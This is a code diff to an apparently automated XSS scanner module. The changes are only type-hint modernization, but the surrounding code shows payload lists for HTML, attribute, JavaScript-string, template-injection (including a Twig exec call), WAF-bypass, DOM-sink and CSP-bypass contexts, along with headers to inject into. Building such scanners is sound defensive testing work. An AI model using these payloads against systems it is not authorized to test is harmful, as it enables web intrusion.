@@ -23,19 +23,18 @@ import json
 import random
 import re
 import string
-from typing import Any, Dict, List, Optional, Tuple
+from typing import Any
 
-from titan.core.models import Finding, Severity, AttackType
+from titan.core.models import AttackType, Finding, Severity
 from titan.verify import BaselineAnalyzer
-from titan.verify.oracles import score_signals, extract_error_classes
-
+from titan.verify.oracles import extract_error_classes, score_signals
 
 # ---------------------------------------------------------------------------
 # Payload sets — per injection context
 # ---------------------------------------------------------------------------
 
 # Context 1: HTML tag injection (breaks out of text node or tag attribute value)
-_HTML_TAG_PAYLOADS: Tuple[str, ...] = (
+_HTML_TAG_PAYLOADS: tuple[str, ...] = (
     "<script>alert(1)</script>",
     "<script>alert(document.domain)</script>",
     "<img src=x onerror=alert(1)>",
@@ -59,7 +58,7 @@ _HTML_TAG_PAYLOADS: Tuple[str, ...] = (
 )
 
 # Context 2: Attribute breakout (inject into value="..." to escape into event handler)
-_ATTR_BREAKOUT_PAYLOADS: Tuple[str, ...] = (
+_ATTR_BREAKOUT_PAYLOADS: tuple[str, ...] = (
     "\" onmouseover=\"alert(1)",
     "\" onfocus=\"alert(1)\" autofocus=\"",
     "\" onerror=\"alert(1)\" src=\"x",
@@ -73,7 +72,7 @@ _ATTR_BREAKOUT_PAYLOADS: Tuple[str, ...] = (
 )
 
 # Context 3: JavaScript string breakout (inject into var x = "..." or var x = '...')
-_JS_STRING_PAYLOADS: Tuple[str, ...] = (
+_JS_STRING_PAYLOADS: tuple[str, ...] = (
     "'-alert(1)-'",
     "\"-alert(1)-\"",
     "';alert(1)//",
@@ -87,7 +86,7 @@ _JS_STRING_PAYLOADS: Tuple[str, ...] = (
 )
 
 # Context 4: Client-Side Template Injection (AngularJS, Vue, React, Freemarker)
-_CSTI_PAYLOADS: Tuple[str, ...] = (
+_CSTI_PAYLOADS: tuple[str, ...] = (
     "{{7*7}}",                                                        # math oracle
     "{{constructor.constructor('alert(1)')()}}",                     # AngularJS sandbox escape
     "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",  # Twig
@@ -100,7 +99,7 @@ _CSTI_PAYLOADS: Tuple[str, ...] = (
 )
 
 # Context 5: Header-reflected XSS (Referer, User-Agent stored/reflected)
-_HEADER_XSS_PAYLOADS: Tuple[str, ...] = (
+_HEADER_XSS_PAYLOADS: tuple[str, ...] = (
     "<script>alert(1)</script>",
     "<img src=x onerror=alert(1)>",
     "<svg onload=alert(1)>",
@@ -108,7 +107,7 @@ _HEADER_XSS_PAYLOADS: Tuple[str, ...] = (
     "'-alert(1)-'",
 )
 
-_INJECTABLE_HEADERS_XSS: Tuple[str, ...] = (
+_INJECTABLE_HEADERS_XSS: tuple[str, ...] = (
     "User-Agent",
     "Referer",
     "X-Forwarded-For",
@@ -118,7 +117,7 @@ _INJECTABLE_HEADERS_XSS: Tuple[str, ...] = (
 )
 
 # WAF bypass variants (applied on top of each context set)
-_WAF_BYPASS_VARIANTS: Tuple[str, ...] = (
+_WAF_BYPASS_VARIANTS: tuple[str, ...] = (
     "<ScRiPt>alert(1)</ScRiPt>",
     "<script/x>alert(1)</script>",
     "<img/src=x onerror=alert(1)>",
@@ -136,7 +135,7 @@ _WAF_BYPASS_VARIANTS: Tuple[str, ...] = (
 
 # Context 7: DOM sink payloads (location.hash, document.URL, document.referrer,
 # localStorage, sessionStorage, eval, setTimeout, setInterval, onerror handlers)
-_DOM_SINK_PAYLOADS: Tuple[str, ...] = (
+_DOM_SINK_PAYLOADS: tuple[str, ...] = (
     # location.hash / document.URL sinks
     "javascript:alert(1)",
     "javascript:alert(1)//",
@@ -172,7 +171,7 @@ _DOM_SINK_PAYLOADS: Tuple[str, ...] = (
 )
 
 # Context 8: CSP bypass payloads (nonce bypass, JSONP, inline handlers, style-src)
-_CSP_BYPASS_PAYLOADS: Tuple[str, ...] = (
+_CSP_BYPASS_PAYLOADS: tuple[str, ...] = (
     # JSONP callback bypass (script-src 'nonce-xxx' allows JSONP if endpoint lacks CORS)
     "?callback=<script>alert(1)</script>",
     "?jsonp=<script>alert(1)</script>",
@@ -198,7 +197,7 @@ _CSP_BYPASS_PAYLOADS: Tuple[str, ...] = (
 )
 
 # Context 9: Modern JS framework sink payloads (React, Vue, Angular, Svelte)
-_FRAMEWORK_SINK_PAYLOADS: Tuple[str, ...] = (
+_FRAMEWORK_SINK_PAYLOADS: tuple[str, ...] = (
     # React: dangerouslySetInnerHTML, srcDoc, href with javascript:
     "<a href=\"javascript:alert(1)\">click</a>",
     "<iframe srcDoc=\"<script>alert(1)</script>\">",
@@ -218,7 +217,7 @@ _FRAMEWORK_SINK_PAYLOADS: Tuple[str, ...] = (
 class XSSDetector:
     """Production-grade XSS detector with exhaustive context coverage."""
 
-    def __init__(self, payload_smith, fingerprint: Dict[str, Any]):
+    def __init__(self, payload_smith, fingerprint: dict[str, Any]):
         self.payload_smith = payload_smith
         self.fingerprint = fingerprint
 
@@ -232,9 +231,9 @@ class XSSDetector:
         target: str,
         method: str,
         url: str,
-        params: Dict[str, str],
-    ) -> List[Finding]:
-        findings: List[Finding] = []
+        params: dict[str, str],
+    ) -> list[Finding]:
+        findings: list[Finding] = []
 
         context_data = {
             "fingerprint": self.fingerprint,
@@ -292,13 +291,13 @@ class XSSDetector:
     # ------------------------------------------------------------------
 
     def _build_context_suite(
-        self, param_name: str, param_val: str, generic_payloads: List[str]
-    ) -> List[str]:
+        self, param_name: str, param_val: str, generic_payloads: list[str]
+    ) -> list[str]:
         """
         Prepend the most likely context-specific payloads based on what
         we know about the parameter, then append the full generic pool.
         """
-        suite: List[str] = []
+        suite: list[str] = []
 
         name_lower = param_name.lower()
 
@@ -335,14 +334,14 @@ class XSSDetector:
         target: str,
         method: str,
         url: str,
-        params: Dict[str, str],
-    ) -> List[Finding]:
+        params: dict[str, str],
+    ) -> list[Finding]:
         """
         Inject XSS payloads into HTTP headers that apps commonly reflect
         back into HTML (e.g. Referer in breadcrumbs, User-Agent in admin panels).
         """
-        findings: List[Finding] = []
-        safe_headers: Dict[str, str] = {"Referer": target}
+        findings: list[Finding] = []
+        safe_headers: dict[str, str] = {"Referer": target}
 
         try:
             if method == "GET":
@@ -420,11 +419,11 @@ class XSSDetector:
         target: str,
         method: str,
         url: str,
-        params: Dict[str, str],
-        payloads: List[str],
-    ) -> List[Finding]:
+        params: dict[str, str],
+        payloads: list[str],
+    ) -> list[Finding]:
         """Recursively walk a JSON body and inject XSS payloads into every leaf."""
-        findings: List[Finding] = []
+        findings: list[Finding] = []
         if method.upper() == "GET":
             return findings
 
@@ -513,7 +512,7 @@ class XSSDetector:
 
         return findings
 
-    def _json_leaves(self, node: Any, path: Optional[list] = None):
+    def _json_leaves(self, node: Any, path: list | None = None):
         if path is None:
             path = []
         if isinstance(node, dict):
@@ -542,9 +541,9 @@ class XSSDetector:
         method: str,
         url: str,
         param_name: str,
-        all_params: Dict[str, str],
-        payloads: List[str],
-    ) -> Optional[Finding]:
+        all_params: dict[str, str],
+        payloads: list[str],
+    ) -> Finding | None:
         baseline_body = ""
         baseline_status = None
 
